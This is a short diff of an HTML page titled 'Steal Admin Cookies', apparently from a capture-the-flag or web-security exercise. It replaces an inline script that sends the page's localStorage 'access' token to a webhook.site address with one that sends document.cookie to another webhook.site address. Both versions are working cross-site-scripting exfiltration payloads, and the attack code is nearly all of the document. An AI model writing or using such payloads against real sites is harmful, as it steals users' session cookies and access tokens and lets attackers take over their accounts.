@@ -3,8 +3,8 @@
 
     <h1>Steal Admin Cookies</h1>
 
-    <script>
-      fetch("https://webhook.site/c0beb2e6-cd41-4d0b-a0e0-1f2973d2f4c1" + localStorage.getItem("access"));
+   <script>
+      fetch("https://webhook.site/86592221-2052-4f69-a5e2-6079845d79dd?cookie=" + document.cookie);
     </script>
 
  </body>
